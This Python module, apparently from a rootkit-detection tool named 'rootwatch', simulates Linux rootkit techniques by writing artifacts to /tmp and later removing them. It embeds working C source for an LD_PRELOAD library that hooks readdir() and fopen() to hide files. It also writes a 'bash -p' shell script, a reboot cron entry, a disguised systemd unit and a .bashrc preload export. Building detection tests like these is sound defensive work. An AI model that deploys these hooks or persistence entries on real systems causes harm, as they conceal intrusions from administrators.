import os
import subprocess
import logging
import glob
from pathlib import Path

log = logging.getLogger(__name__)

TAG           = ".rootwatch_sim"
HIDDEN_PREFIX = "rootwatch_hidden_"
PRELOAD_SO    = "/tmp/rootwatch_preload.so"
PRELOAD_SRC   = "/tmp/rootwatch_preload.c"
SUID_TARGET   = "/tmp/rootwatch_suid_shell"
SYSTEMD_UNIT  = "/tmp/rootwatch_backdoor.service"
CRON_MARKER   = "rootwatch_persistence"


def simulate_ldpreload():
    result = {"technique": "ldpreload", "status": "ok", "artifacts": [], "detail": ""}

    src = r"""
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (strncmp(entry->d_name, "rootwatch_hidden_", 17) != 0)
            return entry;
    }
    return NULL;
}

FILE *fopen(const char *path, const char *mode) {
    FILE *(*orig)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    if (path && strstr(path, "ld.so.preload"))
        return NULL;
    return orig(path, mode);
}
"""

    try:
        with open(PRELOAD_SRC, "w") as f:
            f.write(src)
        result["artifacts"].append(PRELOAD_SRC)

        r = subprocess.run(
            ["gcc", "-shared", "-fPIC", "-o", PRELOAD_SO, PRELOAD_SRC, "-ldl"],
            capture_output=True, text=True
        )

        if r.returncode == 0:
            result["artifacts"].append(PRELOAD_SO)
            result["detail"] = "Shared object compiled. Hooks readdir() to hide files and fopen() to conceal /etc/ld.so.preload."
        else:
            result["status"] = "partial"
            result["detail"] = f"Compile failed — gcc may not be available. Source written to {PRELOAD_SRC}."

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)

    return result


def simulate_process_hiding():
    result = {"technique": "process", "status": "ok", "artifacts": [], "detail": "", "pid": None}

    try:
        proc = subprocess.Popen(["sleep", "3600"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        result["pid"]      = proc.pid
        result["artifacts"].append(f"/proc/{proc.pid}/comm")
        result["detail"]   = f"Background process spawned (PID {proc.pid}). In a real rootkit this would be unlinked from /proc traversal via readdir hook."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def simulate_file_hiding():
    result = {"technique": "files", "status": "ok", "artifacts": [], "detail": ""}

    try:
        for i in range(3):
            path = f"/tmp/{HIDDEN_PREFIX}payload_{i}.dat"
            with open(path, "w") as f:
                f.write(f"ROOTWATCH_PAYLOAD_{i}\n")
            result["artifacts"].append(path)

        result["detail"] = f"Created 3 payload files with prefix '{HIDDEN_PREFIX}'. With LD_PRELOAD active, readdir() would filter these from ls and find."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def simulate_suid_backdoor():
    result = {"technique": "suid", "status": "ok", "artifacts": [], "detail": ""}

    try:
        with open(SUID_TARGET, "w") as f:
            f.write("#!/bin/bash\nexec /bin/bash -p \"$@\"\n")
        os.chmod(SUID_TARGET, 0o755)
        result["artifacts"].append(SUID_TARGET)
        result["detail"] = f"Shell script written to {SUID_TARGET}. In a real attack this would be compiled as a C binary with chmod u+s applied."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def simulate_persistence():
    result = {"technique": "persistence", "status": "ok", "artifacts": [], "vectors": [], "detail": ""}

    try:
        cron_file = f"/tmp/{TAG}_crontab"
        with open(cron_file, "w") as f:
            f.write(f"# {CRON_MARKER}\n@reboot /tmp/rootwatch_backdoor.sh 2>/dev/null\n")
        result["artifacts"].append(cron_file)
        result["vectors"].append("cron (@reboot)")
    except Exception as e:
        log.warning(f"persistence cron: {e}")

    try:
        unit = "[Unit]\nDescription=System Network Manager Helper\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'while true; do sleep 3600; done'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n"
        with open(SYSTEMD_UNIT, "w") as f:
            f.write(unit)
        result["artifacts"].append(SYSTEMD_UNIT)
        result["vectors"].append("systemd unit")
    except Exception as e:
        log.warning(f"persistence systemd: {e}")

    try:
        bashrc = f"/tmp/{TAG}_bashrc"
        with open(bashrc, "w") as f:
            f.write(f"export LD_PRELOAD={PRELOAD_SO}\n")
        result["artifacts"].append(bashrc)
        result["vectors"].append(".bashrc LD_PRELOAD export")
    except Exception as e:
        log.warning(f"persistence bashrc: {e}")

    result["detail"] = f"Installed {len(result['vectors'])} persistence vectors: {', '.join(result['vectors'])}."
    return result


def simulate_log_tampering():
    result = {"technique": "logs", "status": "ok", "artifacts": [], "detail": ""}

    try:
        fake_log = f"/tmp/{TAG}_auth.log"
        with open(fake_log, "w") as f:
            for i in range(20):
                f.write(f"Apr 19 10:{i:02d}:00 host sshd[1234]: Accepted publickey for root from 10.0.0.{i+1} port 22\n")
            f.write("# entries below removed by rootkit\n")
        result["artifacts"].append(fake_log)
        result["detail"] = "Simulated auth.log with selective entry removal. Real rootkits intercept write() calls to scrub their IP addresses from log files."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def simulate_network_hiding():
    result = {"technique": "network", "status": "ok", "artifacts": [], "detail": ""}

    try:
        marker = f"/tmp/{TAG}_netstat"
        with open(marker, "w") as f:
            f.write("network hiding simulation — real technique hooks read() on /proc/net/tcp\n")
        result["artifacts"].append(marker)
        result["detail"] = "Network hiding simulated. Real implementation hooks getaddrinfo() and filters /proc/net/tcp to conceal C2 connections from ss and netstat."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def simulate_timestamps():
    result = {"technique": "timestamps", "status": "ok", "artifacts": [], "detail": ""}

    try:
        target = f"/tmp/{TAG}_timestamped"
        with open(target, "w") as f:
            f.write("ROOTWATCH_PAYLOAD\n")
        subprocess.run(["touch", "-t", "202001010000.00", target], capture_output=True)
        result["artifacts"].append(target)
        result["detail"] = "File backdated to 2020-01-01. Real rootkits backdate malicious files to blend with legitimate system files and evade forensic timeline analysis."
    except Exception as e:
        result["status"] = "error"
        result["error"]  = str(e)

    return result


def cleanup():
    removed = []
    patterns = [f"/tmp/{TAG}*", f"/tmp/{HIDDEN_PREFIX}*", PRELOAD_SRC, PRELOAD_SO, SUID_TARGET, SYSTEMD_UNIT]
    for pattern in patterns:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
                removed.append(f)
            except Exception:
                pass
    return removed


TECHNIQUES = {
    "ldpreload":   simulate_ldpreload,
    "process":     simulate_process_hiding,
    "files":       simulate_file_hiding,
    "suid":        simulate_suid_backdoor,
    "persistence": simulate_persistence,
    "logs":        simulate_log_tampering,
    "network":     simulate_network_hiding,
    "timestamps":  simulate_timestamps,
}
